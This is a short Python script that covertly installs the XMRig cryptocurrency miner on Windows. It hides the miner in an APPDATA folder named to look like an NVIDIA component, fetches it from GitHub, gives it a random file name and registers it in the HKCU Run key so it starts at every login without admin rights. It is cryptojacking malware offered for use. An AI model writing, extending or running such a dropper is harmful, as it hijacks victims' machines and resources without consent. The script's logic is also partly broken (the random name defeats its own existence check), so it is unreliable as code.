import os, uuid, subprocess, winreg, requests, zipfile, pathlib
app = pathlib.Path(os.getenv("APPDATA")) / "NvBackend"
app.mkdir(exist_ok=True)
pcid = str(uuid.uuid4().int)[:8]
(app / "pcid.txt").write_text(pcid)

# download xmrig if missing
bin = app / f"{uuid.uuid4().hex[:8]}.exe"
if not bin.exists():
    z = requests.get("https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-win64.zip").content
    (app / "tmp.zip").write_bytes(z)
    with zipfile.ZipFile(app / "tmp.zip") as zf:
        zf.extractall(app)
    (app / "xmrig.exe").rename(bin)
    (app / "tmp.zip").unlink()

# registry Run key (no admin)
key = r"Software\Microsoft\Windows\CurrentVersion\Run"
with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as k:
    winreg.SetValueEx(k, "NvBackend", 0, winreg.REG_SZ, str(bin))
